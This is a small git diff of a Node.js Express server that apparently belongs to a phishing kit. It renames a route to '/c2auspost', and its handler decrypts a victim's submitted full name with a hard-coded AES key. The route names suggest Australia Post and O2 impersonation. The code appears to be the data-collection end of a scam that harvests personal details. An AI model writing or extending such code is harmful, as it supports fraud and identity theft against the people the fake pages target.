@@ -344,9 +344,9 @@ app.post("/o2Pac", (req, res) => {
 
 let c2 = 0;
 
-app.options("/ausPostKelv2", cors());
+app.options("/c2auspost", cors());
 
-app.post("/ausPostKelv2", (req, res) => {
+app.post("/c2auspost", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
